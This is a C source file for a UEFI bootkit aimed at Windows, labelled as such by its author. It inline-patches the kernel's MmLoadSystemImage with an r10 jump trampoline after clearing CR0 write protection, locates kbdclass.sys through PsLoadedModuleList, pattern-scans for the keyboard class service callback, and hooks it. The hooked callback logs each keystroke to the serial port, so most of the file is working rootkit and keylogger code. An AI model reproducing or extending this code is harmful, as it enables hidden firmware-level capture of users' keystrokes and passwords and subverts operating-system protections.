/**
 * Author: adi arnon.
 * Purpose: Bootkit :)
 * Date: 18/4/2026
 */

/********************************************************
 * Include
 ********************************************************/
#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/BaseLib.h>
#include <Library/DebugLib.h>
#include <Guid/EventGroup.h>
#include <IndustryStandard/PeImage.h>
#include <Library/IoLib.h>  
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/PrintLib.h>

#include "Hook.h"
#include "Kernel.h"

/********************************************************
 * Globals
 ********************************************************/
EFI_EXIT_BOOT_SERVICES originalExitBootServices = NULL;
UINT64 winloadReturnAddress = 0;
VOID * kernelBase = 0;
UINT64 g_OriginalMmAddress = 0;
VOID* pCheckDriverCallback = NULL; 
UINT64 g_KeyboardFound = 0; 
LIST_ENTRY *g_PsLoadedModuleList = NULL;
VOID* g_KbdBaseAddress = NULL; 
UINT64 g_KbdCallbackAddr = 0;
VOID* g_TargetKbdAddr = NULL;
VOID* g_VirtualKbdHookPtr = NULL;
VOID* g_OriginalKbdCallback = NULL;
UINT64 g_KeyPressCount = 0;
VOID* g_RuntimeKeyboardHook = NULL;
UINT8 g_OriginalKbdBytes[14];
VOID* g_KeyLoggerPtr = NULL;
/********************************************************
 * Functions
 ********************************************************/
/**
 * TODO:
 * 1) Parse ntoskrnl PE to find any asset you want. (Write func for it)  done!
 * https://ferreirasc.github.io/PE-Export-Address-Table/
 * 
 * 2) Find MmLoadSystemImage hook it using r10. (inline asm, chat)     done!
 * 
 * 3) Every time hook catch check PsLoadedModuleList -> Prase it. Find "kbdclass.sys".
 * https://gist.github.com/muturikaranja/b7d4b59c72611e76aed94b2f0bf33aa2      done! 
 * 
 * 4) Set hook on Kbdclass!KeyboardClassServiceCallBack -> msdn read
 * https://phrack.org/issues/69/15
 * https://learn.microsoft.com/en-us/previous-versions/ff542324(v=vs.85) -> MSDN!!!!!!!
 * 5) Print chars using SerialWrite.
 */

extern VOID HookEntry(void);
extern VOID MyKeyboardCallbackHook1(void);

UINT8 g_OriginalKbdBytes[14];
BOOLEAN IsKeyboardDriverName(UNICODE_STRING* DriverName);
VOID ScanForKeyboardDriver();
PKLDR_DATA_TABLE_ENTRY FindKbdclassModule();
BOOLEAN GetTextSection(VOID* ImageBase, VOID** TextBase, UINT32* TextSize);
VOID* FindKeyboardCallback( VOID* TextBase, UINT32 TextSize);
BOOLEAN InstallKeyboardHook(VOID* Target);

char kbd_US[128] =
{
    0, 27, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\b',
    '\t',
    'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
    0,
    'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 0, '\\',
    'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0,
    '*',
    0,
    ' ',
    0,
    0, 0, 0, 0, 0, 0, 0, 0,
    0,
    0,
    0,
    0,
    0,
    0,
    '-',
    0,
    0,
    0,
    '+',
    0,
    0,
    0,
    0,
    0,
    0, 0, 0,
    0,
    0,
    0,
};

VOID SerialWrite(CHAR8 *str)
{
    while (*str) {
        IoWrite8(COM1_PORT, *str++);
    }
}

VOID SerialWriteHex(UINT64 val)
{
    CHAR8 buf[16 + 3 + 2];
    CHAR8 hex[] = "0123456789ABCDEF";
    buf[0] = '0'; buf[1] = 'x';
    for (INT32 i = 17; i >= 2; i--) {
        buf[i] = hex[val & 0xF];
        val >>= 4;
    }
    buf[18] = '\n'; buf[19] = '\r'; buf[20] = 0;
    SerialWrite(buf);
}

//print, for addresses in kernel
VOID SerialWriteUnicode(UNICODE_STRING* uStr) {
    if (!uStr || !uStr->Buffer) 
        return;
    for (UINT16 i = 0; i < uStr->Length / sizeof(CHAR16); i++) {
        CHAR16 c = uStr->Buffer[i];
        IoWrite8(COM1_PORT, (UINT8)(c & 0xFF)); 
    }
    IoWrite8(COM1_PORT, '\n');
    IoWrite8(COM1_PORT, '\r');
}

//looking for pattern
VOID* FindPattern(IN VOID *Base, IN UINTN Size, IN UINT8 *Pattern, IN UINTN PatternSize)
{
    UINT8 *Start = (UINT8*)Base;
    if (!Base || !Pattern || PatternSize == 0 || Size < PatternSize)
        return NULL;
    
    for (UINTN i = 0; i <= Size - PatternSize; i++)
    {
        if (CompareMem(Start + i, Pattern, PatternSize) == 0)
        {
            return (VOID*)(Start + i);
        }
    }
    return NULL;
}

VOID DumpBytesInline(VOID* Address, UINTN Count) {
    if ((UINTN)Address < 0x10000) return; 

    SerialWrite("Dumping Address: ");
    SerialWriteHex((UINT64)Address);
    SerialWrite("\n\r");

    UINT8* buf = (UINT8*)Address;
    for (UINTN i = 0; i < Count; i++) {
        CHAR8 hex[4];
        const char* chars = "0123456789ABCDEF";
        hex[0] = chars[buf[i] >> 4];
        hex[1] = chars[buf[i] & 0x0F];
        hex[2] = ' ';
        hex[3] = '\0';
        SerialWrite(hex);
        
        if ((i + 1) % 16 == 0) SerialWrite("\n\r"); 
    }
    SerialWrite("\n\r");
}

VOID* FindKeyboardCallback( VOID* TextBase, UINT32 TextSize)
{
    UINT8 pattern[] =
    {
        0x48, 0x8B, 0xC4,
        0x48, 0x89, 0x58, 0x08,
        0x48, 0x89, 0x70, 0x10,
        0x48, 0x89, 0x78, 0x18,
        0x4C, 0x89, 0x48, 0x20
    };
    PVOID targetAddress = FindPattern(TextBase, TextSize, pattern, sizeof(pattern));
    if (targetAddress != NULL) {
    SerialWrite("Found potential function! Dumping first 16 bytes:\r\n");
    //DumpBytesInline(targetAddress, 16);
    } 

    else {
        SerialWrite("Pattern not found!\r\n");
    }
    return FindPattern(TextBase, TextSize, pattern, sizeof(pattern));

}


VOID DirectInstallMmHook(VOID* TargetFunction)
{
    if (!TargetFunction) return;

    UINT8 HookPatch[13] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, HookEntry
        0x41, 0xFF, 0xE2                                            // jmp r10
    };
    
    *(UINT64*)(HookPatch + 2) = (UINT64)HookEntry; 

    UINT64 cr0 = AsmReadCr0();
    DisableInterrupts();      
    AsmWriteCr0(cr0 & ~0x10000ULL);

    for (int i = 0; i < 13; i++) {
        ((UINT8*)TargetFunction)[i] = HookPatch[i];
    }

    AsmWriteCr0(cr0);
    EnableInterrupts();
}

BOOLEAN InstallKeyboardHook(VOID* Target)
{
    if (!Target || !g_RuntimeKeyboardHook) {
        SerialWrite("Error: Target or RuntimeHook not initialized!\n\r");
        return FALSE;
    }

    g_OriginalKbdCallback = Target;
    SerialWrite("Installing hook at: ");
    SerialWriteHex((UINT64)Target);
    SerialWrite("Jump destination (Virtual): ");
    SerialWriteHex((UINT64)g_RuntimeKeyboardHook);

    UINT8 HookPatch[15] =
    {
        0x49, 0xBA,                          // mov r10, ...
        0,0,0,0,0,0,0,0,                     // placeholder
        0x41, 0xFF, 0xE2,                    // jmp r10
        0x90, 0x90                           // NOPs
    };

    *(UINT64*)(HookPatch + 2) = (UINT64)MyKeyboardCallbackHook1;
    UINT64 cr0 = AsmReadCr0();
    AsmWriteCr0(cr0 & ~0x10000ULL); 
    CopyMem(Target, HookPatch, 15);
    AsmWriteCr0(cr0); 
    
    SerialWrite("Keyboard hook installed successfully!\n\r");
    return TRUE;
}


// Set to fastcall like windows calling convention.
VOID EFIAPI MyKeyboardCallbackHook(VOID* DeviceObject, KEYBOARD_INPUT_DATA* InputDataStart,KEYBOARD_INPUT_DATA* InputDataEnd, UINT32* InputDataConsumed)
{
    for (; InputDataStart < InputDataEnd; InputDataStart++)
    {
        UINT16 scan_code = InputDataStart->MakeCode;
        char tav = kbd_US[scan_code];
        char string[2] = {tav, '\0'};  
        if (InputDataStart->Flags == KEY_MAKE) 
        {
            SerialWrite(string);
        }
    }
}

EFI_STATUS InstallPureAsmHook(VOID* TargetFunction)
{
    if (!TargetFunction) 
        return EFI_INVALID_PARAMETER;

    g_OriginalMmAddress = (UINT64)TargetFunction;
    UINT8* ptr = (UINT8*)TargetFunction;

    UINT8 HookPatch[13] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, HookEntry
        0x41, 0xFF, 0xE2                                            // jmp r10
    };
    
    VOID* RuntimeHookAddress = (VOID*)HookEntry; 
    gRT->ConvertPointer(0, &RuntimeHookAddress); 
    VOID* pOriginalAddr = (VOID*)&g_OriginalMmAddress;
    gRT->ConvertPointer(0, &pOriginalAddr);
    pCheckDriverCallback = (VOID*)CheckDriverCallback;
    gRT->ConvertPointer(0, &pCheckDriverCallback);
    VOID* pFlag = (VOID*)&g_KeyboardFound;
    gRT->ConvertPointer(0, &pFlag);
    *(UINT64*)(HookPatch + 2) = (UINT64)RuntimeHookAddress;
    UINT64 cr0 = AsmReadCr0();
    AsmWriteCr0(cr0 & ~0x10000ULL);
    CopyMem(TargetFunction, HookPatch, 13);
    AsmWriteCr0(cr0);

    SerialWrite("Hook installed successfully with JMP r10\n");
    return EFI_SUCCESS;
}
